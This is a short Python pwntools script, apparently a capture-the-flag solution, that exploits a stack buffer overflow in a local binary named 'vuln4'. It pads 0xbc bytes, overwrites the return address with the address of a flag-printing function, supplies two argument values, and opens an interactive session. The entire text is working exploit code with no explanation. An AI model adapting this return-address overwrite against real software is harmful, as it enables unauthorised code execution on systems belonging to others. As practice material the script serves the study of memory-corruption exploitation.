from pwn import *

flag_add = 0x080485E6
a1 = 0xDEADBEEF
a2 = 0xC0DED00D
a = process('./vuln4')

buf = 'a'*0xbc
buf += p32(flag_add) + 'aaaa' + p32(a1) + p32(a2)

a.sendline(buf)
a.interactive()